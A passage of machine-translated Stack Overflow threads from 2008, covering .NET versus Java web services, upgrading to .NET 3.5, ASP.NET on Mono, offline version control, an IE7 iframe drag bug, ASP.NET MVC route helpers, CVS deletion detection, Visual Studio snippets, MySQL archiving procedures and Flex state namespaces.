如果您已经在使用 java，并且没有任何 .NET 的东西，请坚持使用 java - 它会为您节省很多钱（如果您要使用 Visual Studio，正如我所提到的），并且可能需要一些时间来学习 .NET 的细节

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T17:23:38.317

以我的经验，Web 服务在 Visual Studio 中的集成比在 Java 编辑器中更紧密。

Eclipse IDE 甚至没有内置[JAX-WS](https://jax-ws.dev.java.net/)（Java 标准 Web 服务堆栈）支持，而是选择使用[Apache Axis 1](http://ws.apache.org/axis/)。

不过，Netbeans 支持 JAX-WS。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-15T17:23:39.393

我个人更喜欢 .NET 而不是 Java，原因有很多我不想经历，因为这并不重要，而且更多的是个人偏好，而不是我推荐的严格指南。

如果您有 Java 基础架构或使用 Windows 以外的平台作为服务器应用程序，我强烈建议您使用 Java。但是，如果您没有任何东西并在 Windows 平台上运行，那么 .NET 在该领域非常酷（WCF/ASMX/WSE/...）。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-15T17:35:44.113

正如您所说，您是 C++ - 呃您可能会发现 .NET 更容易，因为您可以直接从 C++ 定位它。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-12-15T19:15:06.423

我是 Java 人，但我认为 Web 服务更容易在 .NET 中编写代码。Visual Studio 负责一切，在 Java 中需要一点时间才能开始。在使用 JAX-WS 的某些项目中的一个问题是，SUN 将“旧”版本 2.0 与 Java 6 一起提供。如果您想使用当前版本，则需要进行一些工作以[使其](http://weblogs.java.net/blog/ramapulavarthi/archive/2007/01/problems_using.html)与 Java 5 和 Java 6 一起运行。

如果您的应用程序必须是可移植的，那么您显然应该选择 Java。否则我会说它只是您首选语言的选择，因为上述问题非常小（也许您想选择 Axis 或其他东西，我还没有使用过 JAX-WS 以外的东西）。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-12-15T19:22:28.000

IMO 如果你想做 SOAP，那么使用 .NET 和 WCF 会容易得多。但是，我发现 REST 使用 WCF 有点棘手，并且必须实现一个自定义 XML 解析器来完成它，而不是使用它们的内置解析器。

您可能也想考虑您的托管环境。如果您打算从 Windows 硬件提供此服务，您可以将 .NET WCF Web 服务放入 IIS。如果您要运行 Linux/Solaris 服务器，那么这甚至都不是问题……

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2012-02-23T03:07:03.330

我建议使用 JSP 实现，它提供了一个健壮的开发平台我更喜欢 JSP 而不是 ASP 或任何微软技术！

# asp.net-3.5 - 帮助我说服上级允许切换到 .Net 3.5（从 2.0）

> ID：369063
> 
> 赞同：4
> 
> 时间：2008-12-15T17:14:07.947
> 
> 标签：asp.net-3.5

在纯数据库交互以外的领域使用 linq 的乐趣让我大吃一惊。（请参阅[调用其他代码书呆子 - 嵌套循环的替代方案？](https://stackoverflow.com/questions/365352/calling-fellow-code-nerds-alternatives-to-nested-loops)）。

我们被困在 2.0 上。我已经告诉了有关轻松更新到 3.5 的权力（我们已经迁移到 VS2008），但他们想要一份升级的“好处”列表。

那些在 3.5 方面有经验的人能否提供一些关于将现有应用程序更新到 3.5 的好处的谈话要点？

更新：发现了另一个原因：Microsoft 将 Asp.Net 的图表工具作为补丁包含在 3.5 之上！他们得到了他们的商业价值，我得到了乐趣......

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-12-15T17:47:33.667

你可以为它辩护吗？听起来你想要它，因为 LINQ 很有趣。其他人都在提到*有趣*的功能。我一直在向管理层出售*有趣*的功能时遇到问题，因为它们并不是可能破坏环境的非常有说服力的理由。

老实说，这实际上取决于您使用 C# 的目的。您是 Web 开发人员、系统管理员还是其他人？采取一般方法，我会使用以下卖点（您需要做一些工作来证明这些事情）：

1.  **升级时对最终用户的零中断。**升级到新版本将是无缝的，我们将有一个彻底审查的测试计划，用于将所有客户端更新到此版本。我们所有需要 .NET 1.x 或 .NET 2.0 的旧应用程序仍然可以完美运行。
2.  **程序员效率**。您可能会提到更多的 Windows API 是如何由 .NET 类包装的，从而使程序员更有效率，因为他们不需要 P/Invoke 那么多。由于 x、y 和 z，LINQ 使您的工作效率更高。由于 x、y 和 z，Lambda 表达式使您更有效率。
3.  **减轻未来操作系统迁移的痛苦**。现在迁移到 WPF 将使我们为 Vista/Windows 7 做好准备。我们不必将使用现已弃用的“Windows 窗体”的应用程序迁移到 WPF，因为我们已经在使用它了。
4.  **从第三方购买的更多应用程序将需要它**，因此我们迟早必须升级。

最后，您需要证明，至少，就增加支持或测试成本而言，这一举措不会让您花钱。如果你能证明它会让你更有效率，而且这将是一个相当轻松的转换，那么你就会如愿以偿。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-15T17:29:49.443

也许您应该与一些 Java 开发人员交谈，他们可能仍然被迫使用 1.3 或 1.4 进行开发，尽管 1.5 已经推出了 3 年多，而 1.6 已经推出了几年……看起来整个业务的平台一致性通常比好处更重要使用最新最好的。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-12-15T17:46:03.483

还要记住 3.5 只是附加的 BCL 库。您仍在 CLR 2.0 上运行。3.0 也是如此。通常，当人们发现底层框架是相同的并且您只是添加新库时，他们更有可能接受它。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-15T17:43:23.707

您不需要 .NET 3.5 即可获得 LINQ 或 C# 3.0 功能。您可以为 .NET 2.0 实现自己的 LINQ。我在 .NET 2.0 应用程序中到处使用 C# 3.0。我不知道如何开始转换过程的全部细节，因为我没有自己设置。这对您来说可能是一个很好的链接：[http](http://www.danielmoth.com/Blog/2007/05/using-c-30-from-net-20.html) ://www.danielmoth.com/Blog/2007/05/using-c-30-from-net-20.html 。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-15T17:44:21.333

[http://msdn.microsoft.com/en-us/library/ms171868.aspx](http://msdn.microsoft.com/en-us/library/ms171868.aspx)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-15T18:09:29.567

过渡到 3.5 将帮助您获得以下好处/功能：

1.  LINQ to（实体/XML/对象/数据集等）。
2.  WCF、WF 和 WPF。
3.  ASP.net MVC，其中 MVC 是其他平台（如 Ruby/Python）中的一种事实上的标准，允许您基于纯 HTML/Javacript 进行开发。
4.  ADO.net Entity Framework/Linq to Sql 4 的 ORM 选项。
5.  通过一些插件，您可以支持 IronPython/IronRuby 等动态语言。

哦，我差点忘了 ADO.net Data Services..one 我的最爱。

这些是我立即想到的几个好处。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T17:33:08.050

根据我的经验，仅添加 LINQ 和 Extension 方法就使许多以前艰巨和/或耗时的任务变得更加轻松和快捷。仅凭这一点就提高了开发人员的工作效率，恕我直言，升级努力是值得的。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-15T17:38:49.583

Lambda 表达式很棒。我发现 lambda 表达式以非常简洁易读的方式帮助我的地方没有尽头。

自动属性虽然是一个简单的概念，但确实有助于使代码库更小更清晰。

另外，我第二个扩展方法。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-16T17:38:53.140

在我打开这个问题之前，我得到了答案：LINQ——它是 .NET 中最伟大的扩展之一——我喜欢它。我花了几天时间才弄明白，但现在我明白了，我到处都在使用它。在我看来，查询集合和数组的能力值得单独升级。

*   缩短开发时间（因此提高投资回报率）
*   减少为已在较新版本中修复的 .NET 错误寻找解决方法所浪费的时间。
*   本机类型的扩展方法（类似于 JavaScript 原型设计）
*   LINQ 扩展——它们需要几天时间才能让你明白，但它太棒了！
*   LINQ to XML 使使用 XML 变得如此简单
*   LINQ to 对象/集合
*   一张来自 Microsoft 的漂亮的新 3.5 海报，您可以将其张贴在您的隔间中。

作为一名经理，如果我有一个更快乐、更高效的团队，可以在更短的时间内生产更多的东西，那么它就很简单了。

问问自己：一旦您考虑了服务器上的升级/过渡/安装/附加测试等，开发人员是否会更有效，他们提高的生产力是否会真正增加公司的利益或降低公司成本？如果答案确实是肯定的，那么进行升级并停止争论。

# .net - 开发在 Mono 和 Windows 下运行的 ASP.Net Web 应用程序有多难？

> ID：369064
> 
> 赞同：3
> 
> 时间：2008-12-15T17:14:08.510
> 
> 标签：.net, asp.net, asp.net-mvc, mono

我们即将使用 ASP.Net 从头开始​​开发一个 Web 应用程序，并希望它尽可能与平台无关。据我所知，唯一的两个选项是 Windows 上的 IIS 和 Linux 上的 Mono（通过 Apache）。

该应用程序将遵循 MVC 架构，因此考虑到所有这些，开发应用程序以满足这些要求有多难？（我认为与平台无关的基础开发比移植现有应用程序更容易。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T17:42:21.230

如果您使用 .NET 1.1，则不会有任何问题，但如果您使用 .NET 2.0，请记住 MONO 不支持 .NET 2.0 100%，因此您必须阅读其中的问题。

单声道项目[在他们的网站上谈到了这一点](http://www.mono-project.com/ASP.NET)。但总而言之，它们只是不支持 WebPart 和一些您可能不会遇到的小众事物。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T17:32:31.187

不，一点也不难。大多数事情都运作良好。棘手的部分是配置服务器，而不是开发。我已经在 Apache/Mono/Ubuntu 上部署了几个用 Visual Studio 开发的应用程序，它们运行良好，无需任何修改。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T17:20:36.657

如果您在谈论 ASP.NET MVC，我不确定 MONO 是否支持它。

我是 ASP.NET 的忠实拥护者，因为我以此为生，但我个人并不认为 MONO 真的是一个生产就绪、可行的解决方案。

如果您必须能够在 IIS 或 Apache 下运行，您可能会考虑使用不同的技术。

# version-control - 离线源代码控制

> ID：369065
> 
> 赞同：11
> 
> 时间：2008-12-15T17:14:12.487
> 
> 标签：version-control, dvcs

我即将开始一个项目，程序员将在家中做出贡献（就像构建了 stackoverflow）

我想使用一些集中的源代码控制，但我不希望它要求程序员在线，服务器可能会不时离线（因为起初它可能是我的台式机）

我想我记得 Jeff 在某个播客中谈到过这个，但我不记得是哪一个了。

是否有可能通过电子邮件异步工作的源代码控制工具？程序员可以连接以下载最新版本，例如，签入过程会将文件发送到电子邮件帐户

这样的事情存在吗？

编辑：对不起，我忘了说我将使用 .NET (Visual Studio 2008)

如果它可以集成到这个环境中，那就太好了...... GIT（下面建议）支持吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2008-12-15T17:17:56.597

[`git`](http://git.or.cz/)基本上是以这种场景作为主要需求之一构建的。

其他人也支持它，他们通常以“分布式版本控制系统”的名义进行。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-15T17:24:48.970

您正在寻找[分布式修订控制](http://en.wikipedia.org/wiki/Distributed_revision_control)系统，例如 Git、Bazaar 或 Mercurial。

我个人喜欢 Bazaar，因为它有很好的 Windows 支持。

我认为[Mercurial](http://www.selenic.com/mercurial/wiki/)可能是您的最佳选择，因为它似乎有一个 Visual Studio 插件。它确实有一个 Web 界面和 ssh 支持，这可能是比电子邮件更好的选择，但也有一个扩展允许通过电子邮件打补丁。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-12-15T17:16:52.310

[git](http://git.or.cz/)和[mercurial](http://www.selenic.com/mercurial/wiki/)都会这样做；他们允许通过电子邮件发送的补丁进行同步。其他分布式源代码控制软件可能也可以工作。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-12-15T17:18:33.180

您可以为此目的使用[git 。](http://git.or.cz)它不需要访问中央服务器，但您可以根据需要设置一个。Git 区分了提交和推/拉，因此离线工作效果很好。git 网站有很好的文档。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-12-15T17:48:02.950

[颠覆](http://subversion.tigris.org/)是杰夫在播客中所说的。您可以购买用于 Visual Studio 集成的 VisualSVN。svn 在离线时工作得非常好，因为您不需要与服务器交谈，除非您正在签入或取出东西。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-15T17:19:14.753

Sourcegear 保险库有一个附加功能，允许这样做

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T18:21:52.397

还有一个用于 Subversion 的免费 SmartSVN 工具，它与 Windows shell 集成（添加精美的图标，让您区分本地修改的文件和原始文件等）。我在家和办公室工作时都使用过 Subversion 和 SmartSVN，我只能推荐它。[在此处](https://www.smartsvn.com/features)查看其功能。

# iframe - iFrame 导致 IE7 中的脚本拖拽问题（包括完整代码）？

> ID：369090
> 
> 赞同：0
> 
> 时间：2008-12-15T17:21:47.667
> 
> 标签：iframe, internet-explorer-7, scriptaculous, draggable

当我在 IE7 中的 iframe 上拖动可拖动 div 内的链接时，我得到了非常奇怪的结果。试试下面的代码，如果你对如何解决这个问题有任何建议，请告诉我。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
    <!--<script type="text/javascript" src="/js/prototype.js"></script>-->
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/prototype/1.6.0.3/prototype.js"></script>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/scriptaculous/1.8.2/scriptaculous.js?load=effects,dragdrop,controls"></script>
    <!--<script type="text/javascript" src="/js/scriptaculous.js?load=effects,dragdrop,controls"></script>-->
</head>

<body>
    <div id="test" style="background-color: #aaaaaa; width: 200px; height: 50px;">
        <a href="blah" onclick="blah(); return false;">blah</a>
    </div>
    <iframe>    
    </iframe>
</body>

<script>
function blah(){
    //blackbird.debug("blah");
}

    var dummy = new Draggable("test", {scroll:window,scrollSensitivity: 20,scrollSpeed: 25, revert: true, onStart: onDragStart, onEnd: onDragEnd });
    var temp;
    function onDragStart(drgObj,mouseEvent){
            temp = mouseEvent.target.onclick;
            mouseEvent.target.onclick = function(e){
                mouseEvent.target.onclick = temp;
                return false;
            }
    }

    function onDragEnd(drgObj,mouseEvent){
    }
</script>
</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T18:03:15.790

我发现优雅地处理这个问题的唯一方法是在 iframe 上放置一个完整大小的 div，透明度 = 1%，然后将我的内容拖到它上面。

PS 拖动问题也在 IE6 和 IE8 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-28T19:13:25.380

好吧，我无法测试您的代码。但我正在研究一个 iframe，在 iframe 顶部也有可拖动的项目。

我遇到的问题是 starteffect 在设置它的不透明度时遇到了问题。我所做的是 starteffect:'' 在我的新 Draggable js 代码中，并在 iframe 中创建了一个干净的 div。

这是我的一段代码：

```
<div id="main_container">
    <div>
        <iframe></iframe>
    </div>
    <div id="youredragelelement"><img /></div>
</div> 
```

对于整页 iframe，我来到了这个网站，它非常适合我： http: [//www.dev-explorer.com/articles/full-page-iframe](http://www.dev-explorer.com/articles/full-page-iframe)

希望能帮助到你..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T18:14:39.917

你可以发布代码吗？我不确定我是否理解。

我将 iframe 包裹在一个 div 中，它没有任何区别。

```
<div style="filter:alpha(opacity=1); opacity: 0.01; -moz-opacity:0.01;">
     <iframe>   
     </iframe>
</div> 
```

# asp.net-mvc - 当操作方法不采用原始类型时使用强类型 ActionLink

> ID：369102
> 
> 赞同：1
> 
> 时间：2008-12-15T17:25:32.060
> 
> 标签：asp.net-mvc, routing, actionlink, htmlextensions

有谁知道我该怎么做：

Html.ActionLink(c => c.SomeAction(new MessageObject { Id = 1 } ))

这应该输出一个带有“/Controller/SomeAction/1”的url的链接，指向一个ActionMethod，如下所示：

```
public Controller : Controller
{
  public ActionResult SomeMethod(MessageObject message)
  {
      // do something with the message
      return View();
  }
} 
```

我为生成表单编写了类似的内容，但不需要在 Url 的末尾包含 Id 值。基本上我想在我的路线中进行某种反向查找，但我找不到任何关于如何去做的文档。我有一个能够从 GET 和 POST 参数构建 MessageObject 的 ModelBinder 设置，但我不确定如何反转该过程。

谢谢，马特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-17T11:32:47.230

最后，我最终将以下代码包装在 HtmlHelper 扩展方法中。这将允许我使用类似 Html.ActionLink(c => c.SomeAction(new MessageObject { Id = 1 } ))

并将 MessageObject 的所有属性创建为 RouteValues。

```
 public static RouteValueDictionary GetRouteValuesFromExpression<TController>(Expression<Action<TController>> action)
            where TController : Controller
        {
            Guard.Against<ArgumentNullException>(action == null, @"Action passed to GetRouteValuesFromExpression cannot be null.");
            MethodCallExpression methodCall = action.Body as MethodCallExpression;
            Guard.Against<InvalidOperationException>(methodCall == null, @"Action passed to GetRouteValuesFromExpression must be method call");
            string controllerName = typeof(TController).Name;
            Guard.Against<InvalidOperationException>(!controllerName.EndsWith("Controller"), @"Controller passed to GetRouteValuesFromExpression is incorrect");

            RouteValueDictionary rvd = new RouteValueDictionary();
            rvd.Add("Controller", controllerName.Substring(0, controllerName.Length - "Controller".Length));
            rvd.Add("Action", methodCall.Method.Name);

            AddParameterValuesFromExpressionToDictionary(rvd, methodCall);
            return rvd;
        }

        /// <summary>
        /// Adds a route value for each parameter in the passed in expression.  If the parameter is primitive it just uses its name and value
        /// if not, it creates a route value for each property on the object with the property's name and value.
        /// </summary>
        /// <param name="routeValues"></param>
        /// <param name="methodCall"></param>
        private static void AddParameterValuesFromExpressionToDictionary(RouteValueDictionary routeValues, MethodCallExpression methodCall)
        {
            ParameterInfo[] parameters = methodCall.Method.GetParameters();
            methodCall.Arguments.Each(argument =>
            {
                int index = methodCall.Arguments.IndexOf(argument);

                ConstantExpression constExpression = argument as ConstantExpression;
                if (constExpression != null)
                {
                    object value = constExpression.Value;
                    routeValues.Add(parameters[index].Name, value);
                }
                else
                {
                    object actualArgument = argument;
                    MemberInitExpression expression = argument as MemberInitExpression;
                    if (expression != null)
                    {
                        actualArgument = Expression.Lambda(argument).Compile().DynamicInvoke();
                    }

                    // create a route value for each property on the object
                    foreach (PropertyDescriptor descriptor in TypeDescriptor.GetProperties(actualArgument))
                    {
                        object obj2 = descriptor.GetValue(actualArgument);
                        routeValues.Add(descriptor.Name, obj2);
                    }
                }
            });
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-16T03:22:01.217

我不确定您到底要做什么，因为您的示例 URL 与您的方法签名所需的不匹配。通常，如果您使用需要复杂对象的方法，则将值传递到查询字符串中或作为表单参数构造该对象，然后 ModelBinder 从参数中提供的数据构造对象。如果您只想传递 id，则该方法通常不带任何参数，您从 RouteData 中提取 id，并在持久存储（或缓存）中查找对象。如果你想做后者，你的方法应该是这样的：

```
public ActionResult SomeMethod()
{
    int messageObjectID;
    if (RouteData.Values.TryGetValue("id",out messageObjectID))
    {
       ... get the object with the correct id and process it...
    }
    else
    {
       ... error processing because the id was not available...
    }
    return View();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-16T10:52:07.733

> 我不确定您到底要做什么，因为您的示例 URL 与您的方法签名所需的不匹配。通常，如果您使用需要复杂对象的方法，则将值传递到查询字符串中或作为表单参数构造该对象，然后 ModelBinder 从参数中提供的数据构造对象。

大声笑，这正是我想要做的 :) 该 url 工作正常并映射到该方法，模型绑定器能够将该 URL 转换为映射到该操作的路由并且工作正常。（该路由将“1”映射到名为 Id 的 RouteValue，然后模型绑定器将其分配给消息对象的 Id 字段）。

我正在尝试做的是另一种方式，进行方法调用并将其转换为路线。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-02-08T18:54:19.680

如果您不介意在您要为其生成 URL 的控制器中的每个操作旁边添加一个方法，您可以按照以下步骤进行操作。与您的 lambda 表达式方法相比，这有一些缺点，但也有一些优点。

执行：-

将此添加到您的控制器中，以获取您想要为其生成强类型 url 的每个操作方法...

```
// This const is only needed if the route isn't already mapped 
// by some more general purpose route (e.g. {controller}/{action}/{message}
public const string SomeMethodUrl = "/Home/SomeMethod/{message}";

// This method generates route values that match the SomeMethod method signature
// You can add default values here too
public static object SomeMethodRouteValues(MessageObject messageObject)
{
   return new { controller = "Home", action = "SomeMethod", 
                message = messageObject };
} 
```

您可以在路线映射代码中使用这些...

```
Routes.MapRoute ("SomeMethod", 
                  HomeController.SomeMethodUrl,
                  HomeController.SomeMethodRouteValues(null)); 
```

而且您可以在需要生成该操作的链接的任何地方使用它们：-例如

```
<%=Url.RouteUrl(HomeController.SomeMethodValues(new MessageObject())) %> 
```

如果你这样做...

1）您的代码中只有一个位置定义了任何操作的参数

2）只有一种方法可以将这些参数转换为路由，因为 Html.RouteLink 和 Url.RouteUrl 都可以将 HomeController.SomeMethodRouteValues(...) 作为参数。

3) 很容易为任何可选的路由值设置默认值。

4) 在不破坏任何 url 的情况下重构代码很容易。假设您需要向 SomeMethod 添加一个参数。您所做的只是更改 SomeMethodUrl 和 SomeMethodRouteValues() 以匹配新参数列表，然后修复所有损坏的引用，无论是在代码中还是在视图中。尝试使用散布在您的代码中的 new {action="SomeMethod", ...} 来执行此操作。

5) 您获得 Intellisense 支持，因此您可以查看构建任何操作的链接或 URL 所需的参数。就“强类型”而言，这种方法似乎比使用没有编译时或设计时错误检查链接生成参数有效的 lambda 表达式更好。

缺点是您仍然必须使这些方法与实际操作方法保持同步（但它们可以在代码中彼此相邻，以便于查看）。纯粹主义者无疑会反对这种方法，但实际上它是在查找和修复原本需要测试才能发现的错误，并且它有助于替换我们过去在 WebForms 项目中使用的强类型 Page 方法。

# version-control - CVS 自动化：如何检测本地文件已被删除以触发 cvs 删除？

> ID：369104
> 
> 赞同：0
> 
> 时间：2008-12-15T17:26:26.673
> 
> 标签：version-control, automation, cvs

我正在寻找自动将 Windows XP 文件结构（一个 wiki）备份到 CVS 中。
通过重复调用*cvs commit*和*cvs add*我可以识别并提交更改的文件和新添加的文件，但是我看不到让我知道本地文件已被删除的 cvs 命令。

一种可能性是使用存储库中的最新文件更新并行文件结构，然后删除仅出现在第二个结构中的那些文件，但我希望有一个更有效的解决方案？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T17:34:10.513

你可以做一个

```
cvs -nq update 
```

并寻找像

```
cvs update: warning: SourceControlledFile.xml was lost 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T17:33:56.427

您需要运行 cvs update 并解析结果。它会告诉您哪些文件已被添加、删除等。然后您可以使用这些文件来运行正确的命令。一个警告：CVS 不容易自动化，因为它与它的消息不是很一致。但你最终会得到它的工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-02-10T15:50:31.623

**更新：**

我在 Windows XP 上使用 CVSNT 2.5.05。发现如果你只是跑

```
cvs remove -R 
```

在目录（没有`-f`参数）上，它只会删除文件系统中实际丢失的文件。对于仍然存在的文件，它只会抛出一条您的自动化脚本可以安全忽略的消息。

这也非常适合在脚本之外使用。现在我可以运行：

```
cvs -nq update | findstr /C:"U " 
```

检查以确保这些都是我想要删除的实际文件，然后在同一个目录上运行：

```
cvs remove -R 
```

* * *

我使用 CVSNT 在 Windows XP 上取得了成功

```
cvs -nq update | findstr /C:"U " 
```

这会产生如下结果：

```
U file1.cs
U file2_23.cs
U directory_1/Reports/test.rpt 
```

当然，这个想法（和其他想法）仅适用于自动化，前提是这些文件实际上是自您上次更新工作副本以来有人添加到存储库中的文件。

我个人使用这个 cmd 只是为了创建一个我需要`cvs remove`在提交之前手动执行的文件列表。

# visual-studio - 在 Visual Studio 中更改默认 XML 注释片段

> ID：369116
> 
> 赞同：26
> 
> 时间：2008-12-15T17:30:39.473
> 
> 标签：visual-studio, code-snippets, xml-comments

当我在 Visual Studio 中点击 /// 时，是否可以从此更改生成的代码段：

```
/// <summary>
/// 
/// </summary> 
```

对此？：

```
/// <summary></summary> 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2011-04-07T00:35:45.990

这是至少在 VS2010 中工作的解决方案。

将底部代码保存为文件 summ.snippet。
Visual Studio 2010 / Tools / Code Snippet Manager
点击导入，浏览到文件。使用默认选项保存。

现在转到您的代码窗口并输入 summ + tab + tab

结果

```
/// <summary>  </summary> 
```

光标在标签中间，准备输入。

这是 summ.snippet 的内容

```
<CodeSnippets xmlns="http://schemas.microsoft.com/VisualStudio/2005/CodeSnippet">

    <CodeSnippet Format="1.0.0">
        <Header>
                <Title>Summary - inline</Title>
                <Description>Created inline summary comment tag</Description>
                <Author>Mike Vanderkley</Author>
                <Shortcut>summ</Shortcut>
                <SnippetTypes>
                        <SnippetType>Expansion</SnippetType>
                </SnippetTypes>
        </Header>
        <Snippet>
            <Code Language="csharp">
                <![CDATA[/// <summary> $end$ </summary>]]>
            </Code>
    </Snippet>
  </CodeSnippet>

</CodeSnippets> 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2011-09-09T20:33:05.007

在我看来，/// 生成的内容编码在：Macros.Samples.Utilities.InsertDocComments

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-12-15T17:33:10.937

我知道 VB 在 VS 2005 和 VS 2008 中是可能的。不过，我上次检查过，遗憾的是，没有办法为 C# 做到这一点。一段时间以来，这一直是我的烦恼。

# sql - MySQL程序？功能？

> ID：369119
> 
> 赞同：0
> 
> 时间：2008-12-15T17:31:24.747
> 
> 标签：sql, mysql, stored-procedures

我需要有一个例程/函数/存储过程/任何东西来将特定帐户从我们的“活动”表存档到非活动表。

我可以把它写成一组查询，一次全部由 PHP 按顺序执行，但我希望将大部分工作卸载到 mysql，因为这里不需要 PHP 参与。

基本上，这将获得所有数据：

```
insert into credit_archive_acc select  * from credit_acc where uid_usr = n; 
delete from credit_acc where uid_usr =n; 
insert into user_archive_usr select * from user_usr where id_usr = n; 
delete from user_usr where id_usr = n; 
```

（大约 3 个其他表我会这样做）

无论如何，我希望能够执行以下操作：调用 archive_account(n); 并让它完成所有工作（如果失败，则作为带有回滚的事务）

我对mysql要求太多了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T17:38:41.907

是的，您可以在 mysql 中编写存储过程，请参阅[http://dev.mysql.com/doc/refman/5.0/en/stored-programs-defining.html](http://dev.mysql.com/doc/refman/5.0/en/stored-programs-defining.html)，但请注意[http://dev.mysql 的限制。 com/doc/refman/5.0/en/stored-program-restrictions.html](http://dev.mysql.com/doc/refman/5.0/en/stored-program-restrictions.html)

有关详细信息，请参阅[http://www.scribd.com/doc/3101271/MySQL-Stored-Procedures-book](http://www.scribd.com/doc/3101271/MySQL-Stored-Procedures-book)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T17:34:54.240

如果您希望每天自动运行，您可能希望使用计划任务（也称为事件）。[您可以在此处](http://dev.mysql.com/tech-resources/articles/event-feature.html)的 MySQL 文档中了解它们。

请记住，您需要使用 MySQL 5.1.6 或更新版本来执行此操作，如果没有，则需要升级（无论如何，新版本中的速度都有一些值得注意的改进）。

# apache-flex - 为什么 mx:states 无法解析为组件实现？

> ID：369120
> 
> 赞同：4
> 
> 时间：2008-12-15T17:32:04.387
> 
> 标签：apache-flex, state, transition

当我在 MXML 文件中设置状态时，我时常会遇到错误。我得到的错误说 mx:states 无法解析为组件实现。

我在下面的 url 中读到，这个问题是由扩展组件引起的——这会以某种方式使编译器无法解析 mx:states。我不明白为什么会这样，但我自己没有任何答案。我也不一定能使这种方法适用于我的所有扩展组件。

[http://life.neophi.com/danielr/2007/01/could_not_resolve_to_a_compone.html](http://life.neophi.com/danielr/2007/01/could_not_resolve_to_a_compone.html)

我想出的解决方法是不使用任何命名空间。因此，我的代码如下所示：

```
<states>...</states> 
```

而不是：

```
<mx:states>...</mx:states> 
```

让这个陌生人（至少对我来说）是标签的孩子没有这个问题的事实。mx:states 无法解析，但其子 mx:State 可以。并且 mx:SetProperty - mx:State 的子级 - 也已解决。

任何人都可以解释这一点，和/或提供比我想出的更好的问题解决方案吗？

顺便说一句，我在 mx:transitions 上看到了同样的问题。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-12-15T20:30:14.557

如果您有一个自定义组件，您可能会将它放在*mx*以外的命名空间中。通过删除命名空间，您走在了正确的轨道上，但您不必这样做。考虑以下示例

```
<example:MyComponent xmlns:mx="http://www.adobe.com/2006/mxml"
    xmlns:example="com.example.*">
</example:MyComponent> 
```

在该代码中，我们在 com.example 包中有一个名为 MyComponent 的自定义组件。现在，我们如何添加自定义状态？这简单！

```
<example:MyComponent xmlns:mx="http://www.adobe.com/2006/mxml"
    xmlns:example="com.example.*">

    <example:states>
        <mx:State name="CustomState">
        </mx:State>
    </example:states>

</example:MyComponent> 
```

组件的属性，如*states*、*transitions*，甚至Button 上的*label*都可以创建为子元素。这些属性必须使用与组件实例相同的命名空间。属性来自继承链中的哪个位置并不重要。即使 com.example.MyComponent 扩展了 mx.containers.Canvas， states 属性也将使用定义 MyComponent 的 XML 命名空间。

简而言之，不要将*states*属性视为*mx:states*，因为属性的*mx:*前缀只是从组件继承而来。但是，当我们定义实际状态本身时，我们必须使用*mx:，*因为那是一个类（不是属性），并且该类是在 mx 命名空间中定义的。

要进一步解释，您可以将*[http://www.adobe.com/2006/mxml](http://www.adobe.com/2006/mxml)**命名空间更改为mx*以外的名称。

```
<zzz:VBox xmlns:zzz="http://www.adobe.com/2006/mxml">
    <zzz:states>
    </zzz:states>
</zzz:VBox> 
```

在该示例中，我们将*mx*更改为*zzz*。现在，*states*属性必须以*zzz:*而不是*mx:*为前缀。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-16T20:58:49.350

```
<mx:VBox xmlns:mx="http://www.adobe.com/2006/mxml"
         width="100%" 
         height="100%"
         backgroundColor="#f7f7f7" 
         xmlns:common="com.americanexpress.voice.view.component.common.*">
    <mx:states name="edit"> 
```

为什么会失败？我还发现，当我定义了多个命名空间时，这会失败。删除`<mx:`地址问题。

# lisp - Clojure 中的“不知道如何从：符号创建 ISeq”错误

> ID：369122
> 
> 赞同：16
> 
> 时间：2008-12-15T17:32:26.630
> 
